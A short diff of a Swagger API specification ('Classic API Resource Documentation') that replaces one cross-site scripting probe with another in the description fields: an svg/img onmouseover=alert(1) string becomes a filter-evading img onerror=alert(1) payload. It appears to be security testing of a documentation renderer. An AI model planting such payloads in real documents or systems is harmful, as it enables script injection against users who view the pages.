@@ -2,7 +2,7 @@ swagger: '2.0'
 info:
   title: Classic API Resource Documentation
   description: |
-    <svg><p><!----><iMg src=x onmouseover=alert(1)></svg>
+    <img/asddds/onerror=alert(1) src=a>
 
   version: production
 basePath: /JSSResource/
@@ -28,7 +28,7 @@ paths:
     delete:
       parameters:
         - description: |
-            <svg><p><!----><iMg src=x onmouseover=alert(1)></svg>
+            <img/asddds/onerror=alert(1) src=a>
 
           format: int64
           in: path
